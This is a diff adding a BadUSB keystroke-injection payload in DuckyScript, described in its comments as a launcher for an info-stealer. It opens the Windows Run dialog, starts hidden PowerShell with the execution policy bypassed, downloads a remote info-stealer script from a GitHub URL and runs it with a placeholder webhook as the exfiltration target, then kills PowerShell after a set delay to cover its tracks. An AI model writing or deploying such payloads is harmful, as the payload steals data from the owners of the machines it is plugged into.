@@ -1,0 +1,11 @@
+REM difference from info-stealer1 is that this kills info-stealer after set time
+REM Payload for info-stealer
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $dc='WEBHOOK_HERE';irm https://raw.githubusercontent.com/SuperJakov/Badusb/main/info-stealer/info-stealer.ps1 | iex
+ENTER
+DELAY 500
+GUI r 
+DELAY 500
+STRING powershell $wait = 50;Start-Sleep $wait;Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "powershell.exe"
+ENTER
